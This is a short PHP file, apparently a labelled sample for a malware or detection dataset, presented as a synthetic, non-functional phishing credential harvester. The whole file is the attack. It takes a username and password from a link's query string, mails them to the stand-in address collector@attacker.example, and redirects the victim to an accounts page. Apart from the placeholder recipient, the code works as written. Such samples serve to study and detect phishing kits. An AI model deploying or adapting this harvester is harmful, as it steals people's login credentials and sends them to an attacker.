<?php
// Synthetic sample - phishing credential harvester (NON-FUNCTIONAL, fake recipient)
// Family: credential capture -> external exfil
// (creds arrive via a crafted link's query string rather than a posted form)
$user = $_GET['username'];
$pass = $_GET['password'];
$body = "u: $user / p: $pass";
mail("collector@attacker.example", "harvest", $body);
header("Location: https://accounts.example.com/");
?>
